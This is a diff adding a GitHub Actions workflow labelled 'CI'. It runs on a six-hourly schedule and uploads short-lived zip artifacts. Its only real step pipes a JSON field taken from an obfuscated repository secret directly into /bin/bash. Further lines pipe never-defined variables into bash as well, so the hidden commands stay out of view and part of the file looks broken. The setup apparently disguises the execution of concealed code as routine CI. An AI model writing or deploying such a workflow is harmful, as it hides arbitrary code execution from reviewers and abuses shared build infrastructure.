@@ -1,0 +1,31 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '53 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          crjfq4: ${{ secrets.crjfq4 }}
+        run: |
+          printf '%s' "$crjfq4" | jq -r .kojgd33 | /bin/bash
+          echo $sl71 | jq -r .pgdvk795 | /bin/bash
+          echo $c63 | jq -r .g31606 | /bin/bash
+          printf '%s' "$aihp404" | jq -r .pq3282 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Z1JidzVi
+          path: "*.zip"
+          retention-days: 1
